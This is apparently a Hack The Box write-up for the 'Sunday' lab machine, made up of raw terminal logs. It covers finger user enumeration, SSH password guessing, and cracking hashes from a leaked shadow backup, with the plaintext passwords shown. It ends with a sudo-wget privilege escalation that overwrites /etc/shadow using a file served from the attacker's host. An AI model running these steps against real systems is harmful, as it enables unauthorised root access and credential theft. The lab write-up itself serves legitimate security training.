@@ -1,0 +1,361 @@
+RECON
+root@kali:~/htb/sunday# nmap -sV -Pn -v 10.10.10.76
+PORT      STATE SERVICE VERSION
+79/tcp    open  finger  Sun Solaris fingerd
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+65000/tcp open  rpcbind
+Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
+
+
+VULN SCAN
+nmap -Pn --script vuln 10.10.10.88
+nmap --script nmap-vulners,vulscan -sV 10.10.10.88
+
+ENUMERATE FINGER
+root@kali:~# git clone https://github.com/pentestmonkey/finger-user-enum.git
+root@kali:~# perl finger-user-enum.pl -u root -t 10.10.10.76
+Can't open perl script "finger-user-enum.pl": No such file or directory
+root@kali:~# cd finger-user-enum/
+root@kali:~/finger-user-enum# perl finger-user-enum.pl -u root -t 10.10.10.76
+Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Worker Processes ......... 5
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 79
+Query timeout ............ 5 secs
+Relay Server ............. Not used
+
+######## Scan started at Tue Nov 24 10:10:59 2020 #########
+root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
+######## Scan completed at Tue Nov 24 10:10:59 2020 #########
+1 results.
+
+1 queries in 1 seconds (1.0 queries / sec)
+root@kali:~/finger-user-enum# perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
+Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Worker Processes ......... 5
+Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
+Target count ............. 1
+Username count ........... 10163
+Target TCP port .......... 79
+Query timeout ............ 5 secs
+Relay Server ............. Not used
+
+######## Scan started at Tue Nov 24 10:11:28 2020 #########
+access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
+anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
+bin@10.10.10.76: bin             ???                         < .  .  .  . >..
+dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
+jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
+la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
+line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
+message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
+miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
+sammy@10.10.10.76: sammy                 console      <Jul 31 17:59>..
+sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
+sys@10.10.10.76: sys             ???                         < .  .  .  . >..
+zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
+######## Scan completed at Tue Nov 24 10:38:59 2020 #########
+13 results.
+
+REVIEW LOGINS SAMMY AND SUNNY WITH FINGER
+root@kali:~/htb/sunday# finger -sl sammy@10.10.10.76
+Login name: sammy     			In real life: sammy
+Directory: /export/home/sammy       	Shell: /bin/bash
+Last login Fri Jul 31 17:59 on console
+No unread mail
+No Plan.
+root@kali:~/htb/sunday# finger -sl sunny@10.10.10.76
+Login name: sunny     			In real life: sunny
+Directory: /export/home/sunny       	Shell: /bin/bash
+Last login Tue Apr 24, 2018 on pts/3 from 10.10.14.4
+No unread mail
+No Plan.
+
+RESCAN SUNDAY HOST
+root@kali:~/htb/sunday# nmap -sC -sV -p- -vv -T4 -oA full 10.10.10.76
+PORT      STATE SERVICE REASON         VERSION
+79/tcp    open  finger  syn-ack ttl 59 Sun Solaris fingerd
+|_finger: ERROR: Script execution failed (use -d to debug)
+22022/tcp open  ssh     syn-ack ttl 59 SunSSH 1.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAKQhj2N5gfwsseuHbx/yCXwOkphQCTzDyXaBw5SHg/vRBW9aYPsWUUV0XGZPlVtbhxFylTZGNZTWJyndzQL3aRcQNouwVH8NnQsT63s4uLKsAP3jx4afAwB7049PvisAxtDVMbqg94vxaJkh88VY/EMpASYNrLFtr1mZngrbAzOvAAAAFQCiLK6Oh21fvEjgZ0Yl0IRtONW/wwAAAIAxz1u+bPH+VE7upID2HEvYksXOItmohsDFt0oHmGMHf9TKwZvqQLZRix0eXYu8zLnTIdg7rVYSjGyRhuWeIkl1+0aIJL4/dzB+JthInTGFIngc83MtonLP4Sj3YL20wL9etVh8/M0ZOedntWrQcUW+8cUWZRlgW8q620HZKE8VqAAAAIB0s8wn1ufviVEKXct60uz2ZoduUgg07dfPfzvhpbw232KYUJ6lchTj2p2AV8cD0fk2lok2Qc6Kn/OKSjO9C0PlvG8WWkVVvlISUY4BEhtqtL3aof7PYp5nCrLK+2v+grCLxOvyYpT1OfDMQbahOWGZ9OCwQtQXKP1wYEQMqMsSRg==
+|   1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAxAwq7HNZXHr7XEeYeKsbnaruPQyUK5IkSE/FxHesBaKQ37AsLjw8iacqUvcs8IuhPfiTtwuwU42zUHu1e1rmLpRlMyLQnjgJH1++fP5E0Qnxj4DrFr7aeRv1FqPkrnK/xCX46AdgUhs4+4YA04yfi8pOlaSEVucYaqWNhuqJkt8=
+35861/tcp open  rpcbind syn-ack ttl 63
+47242/tcp open  unknown syn-ack ttl 59
+Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
+
+
+REVIEW NEW PORT FOUND
+root@kali:~/htb/sunday# telnet 10.10.10.76 22022
+Trying 10.10.10.76...
+Connected to 10.10.10.76.
+Escape character is '^]'.
+SSH-2.0-Sun_SSH_1.3
+
+GUESS SSH PASSWORD FOR SAMMY 
+root@kali:~/htb/sunday# ssh sammy@10.10.10.76 -p 22022
+The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
+RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[10.10.10.76]:22022' (RSA) to the list of known hosts.
+Password: 
+Password: 
+Password: 
+sammy@10.10.10.76: Permission denied (gssapi-keyex,gssapi-with-mic,publickey,keyboard-interactive).
+
+GUESS SSH PASSWORD FOR SUNNY (USED "sunday" name of the host)
+root@kali:~/htb/sunday# ssh sunny@10.10.10.76 -p 22022
+Password: 
+Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+sunny@sunday:~$ uname -a
+SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
+sunny@sunday:~$ id
+uid=65535(sunny) gid=1(other) groups=1(other)
+sunny@sunday:~$ ls -l
+total 11
+drwxr-xr-x 2 sunny other    6 2018-04-15 20:29 Desktop
+drwxr-xr-x 6 sunny other    6 2018-04-15 20:29 Documents
+drwxr-xr-x 2 sunny other    2 2018-04-15 20:29 Downloads
+-rw-r--r-- 1 sunny other 1039 2018-04-15 20:18 local.cshrc
+-rw-r--r-- 1 sunny other  988 2018-04-15 20:18 local.login
+-rw-r--r-- 1 sunny other 1002 2018-04-15 20:18 local.profile
+drwxr-xr-x 2 sunny other    2 2018-04-15 20:29 Public
+sunny@sunday:~$ sudo -l       
+User sunny may run the following commands on this host:
+    (root) NOPASSWD: /root/troll
+sunny@sunday:~$ ls -l Desktop
+total 10
+-rw-r--r-- 1 sunny other 3009 2018-04-15 20:29 addmoresoftware.desktop
+-rw-r--r-- 1 sunny other 2176 2018-04-15 20:29 opensolaris-next-steps.desktop
+-rw-r--r-- 1 sunny other 2070 2018-04-15 20:29 register-opensolaris.desktop
+sunny@sunday:~$ ls -l Documents/ 
+total 6
+drwxr-xr-x 2 sunny other 2 2018-04-15 20:29 Music
+drwxr-xr-x 2 sunny other 2 2018-04-15 20:29 Pictures
+drwxr-xr-x 2 sunny other 2 2018-04-15 20:29 Templates
+drwxr-xr-x 2 sunny other 2 2018-04-15 20:29 Videos
+
+CANNOT READ USER FLAG
+sunny@sunday:~$ cat /export/home/sunny/Desktop/user.txt
+cat: /export/home/sunny/Desktop/user.txt: No such file or directory
+sunny@sunday:~$ cat /export/home/sammy/Desktop/user.txt
+cat: /export/home/sammy/Desktop/user.txt: Permission denied
+
+
+
+PRIVESC
+
+
+UPLOAD LINENUM AND LINPEAS
+sunny@sunday:~$ cd /tmp
+sunny@sunday:/tmp$ wget 10.10.14.8/LinEnum.sh
+--22:11:13--  http://10.10.14.8/LinEnum.sh
+           => `LinEnum.sh'
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46,631 (46K) [text/x-sh]
+
+100%[=========================================================>] 46,631        98.24K/s             
+
+22:11:13 (98.06 KB/s) - `LinEnum.sh' saved [46631/46631]
+
+sunny@sunday:/tmp$ wget 10.10.14.8/linpeas.sh
+--22:12:07--  http://10.10.14.8/linpeas.sh
+           => `linpeas.sh'
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 293,889 (287K) [text/x-sh]
+
+19% [==========>                                               ] 58,179        38.47K/s             l100%[=========================================================>] 293,889        8.75K/s    ETA 00:00
+
+22:12:35 (10.46 KB/s) - `linpeas.sh' saved [293889/293889]
+
+sunny@sunday:/tmp$ ls -la  
+total 358
+drwxrwxrwt  4 root  sys      518 2020-11-24 22:12 .
+drwxr-xr-x 26 root  root      27 2020-07-31 17:59 ..
+-r--r--r--  1 root  root      11 2020-11-24 20:21 .X0-lock
+drwxrwxr-x  2 root  root     176 2020-11-24 20:21 .X11-pipe
+drwxrwxrwt  2 root  root     176 2020-11-24 20:21 .X11-unix
+-rw-r--r--  1 sunny other  46631 2020-11-24 22:05 LinEnum.sh
+-rw-r--r--  1 sunny other 293889 2020-11-24 22:05 linpeas.sh
+-rw-r--r--  1 root  root      30 2020-11-24 20:21 ogl_select244
+sunny@sunday:/tmp$ 
+sunny@sunday:/tmp$ 
+sunny@sunday:/tmp$ chmod +x LinEnum.sh linpeas.sh 
+
+RUN LINENUM
+sunny@sunday:/tmp$ ./LinEnum.sh 
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Tuesday 24 November 2020 22:13:45 IST
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
+
+
+[-] Hostname:
+sunday
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=65535(sunny) gid=1(other) groups=1(other)
+
+
+RUN LINPEAS
+sunny@sunday:/tmp$ ./linpeas.sh   
+ 
+[+] Searching backup-manager files
+
+REVIEW BACKUP DIRECTORY
+sunny@sunday:~$ ls -l /
+total 524
+drwxr-xr-x   2 root root      4 2018-04-15 20:44 backup
+lrwxrwxrwx   1 root root      9 2018-04-15 19:52 bin -> ./usr/bin
+drwxr-xr-x   6 root sys       7 2018-04-15 19:52 boot
+drwxr-xr-x   2 root root      2 2018-04-16 15:33 cdrom
+drwxr-xr-x 265 root sys     265 2020-11-24 20:21 dev
+drwxr-xr-x  10 root sys      10 2020-11-24 20:21 devices
+drwxr-xr-x  78 root sys     225 2020-11-24 22:14 etc
+drwxr-xr-x   3 root root      3 2018-04-15 19:44 export
+dr-xr-xr-x   1 root root      1 2020-11-24 20:21 home
+drwxr-xr-x  19 root sys      20 2018-04-15 19:45 kernel
+drwxr-xr-x  10 root bin     180 2018-04-15 19:45 lib
+drwx------   2 root root      2 2009-05-14 21:27 lost+found
+drwxr-xr-x   2 root root      4 2020-11-24 20:21 media
+drwxr-xr-x   2 root sys       2 2018-04-15 19:52 mnt
+dr-xr-xr-x   1 root root      1 2020-11-24 20:21 net
+drwxr-xr-x   4 root sys       4 2018-04-15 19:52 opt
+drwxr-xr-x   5 root sys       5 2009-05-14 21:21 platform
+dr-xr-xr-x 120 root root 480032 2020-11-24 23:27 proc
+drwx------   6 root root     13 2018-04-24 10:31 root
+drwxr-xr-x   4 root root      4 2018-04-15 19:52 rpool
+drwxr-xr-x   2 root sys      58 2018-04-15 19:53 sbin
+drwxr-xr-x   4 root root      4 2009-05-14 21:18 system
+drwxrwxrwt   4 root sys     518 2020-11-24 23:02 tmp
+drwxr-xr-x  30 root sys      44 2018-04-15 19:46 usr
+drwxr-xr-x  35 root sys      35 2018-04-15 20:26 var
+sunny@sunday:~$ ls -l /backup
+total 2
+-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
+-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup
+sunny@sunday:~$ cat /backup/agent22.backup
+cat: /backup/agent22.backup: Permission denied
+sunny@sunday:~$ cat /backup/shadow.backup 
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+
+
+ON KALI CRACK THE HASHES WITH JOHN
+./john /root/htb/sunday/sunday_hashes --wordlist=/usr/share/wordlists/rockyou.txt
+sunday (sunny)
+cooldude! (sammy)
+
+LOGIN VIA SSH VIA SAMMY ACCOUNT
+root@kali:~/htb/sunday# ssh sammy@10.10.10.76 -p 22022
+Password: 
+Last login: Fri Jul 31 17:59:59 2020
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+sammy@sunday:~$ id
+uid=101(sammy) gid=10(staff) groups=10(staff)
+sammy@sunday:~$ pwd
+/export/home/sammy
+sammy@sunday:~$ ls  -l
+total 6
+drwxr-xr-x 2 sammy staff 4 2018-04-15 20:37 Desktop
+drwxr-xr-x 6 sammy staff 6 2018-04-15 20:15 Documents
+drwxr-xr-x 2 sammy staff 2 2018-04-15 20:15 Downloads
+drwxr-xr-x 2 sammy staff 2 2018-04-15 20:15 Public
+
+GET USER FLAG
+sammy@sunday:~$ cat Desktop/user.txt
+###########################
+
+CHECK SAMMY SUDO PRIVILEGE
+sammy@sunday:~$ sudo -l
+User sammy may run the following commands on this host:
+    (root) NOPASSWD: /usr/bin/wget
+
+
+GET ROOT ACCESS BY ADDING SAMMY PASSWORD AS NEW ROOT PASSWORD
+root@kali:~/htb/sunday# vim shadow
+root@kali:~/htb/sunday# cat shadow
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+root:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+root@kali:~/htb/sunday# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+
+
+DOWNLOAD UPDATED SHADOW FILE WITH ROOT ACCOUNT PASSWORD USING SAMMY (NEED TO USE "O" WGET SWITCH)
+sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.14.8/shadow
+--01:28:19--  http://10.10.14.8/shadow
+           => `/etc/shadow'
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 391 [application/octet-stream]
+
+100%[=========================================================>] 391           --.--K/s             
+
+01:28:19 (80.31 MB/s) - `/etc/shadow' saved [391/391]
+
+sammy@sunday:~$ su root
+Password: 
+sammy@sunday:~# id
+uid=0(root) gid=0(root)
+sammy@sunday:~# cat /root/  
+.bashrc              .gconfd/             .sunw/               troll
+.config/             .profile             overwrite            troll.original
+.gconf/              .recently-used.xbel  root.txt  
+
+GET ROOT FLAG           
+sammy@sunday:~# cat /root/root.txt
+############################
+
+
+
+
+
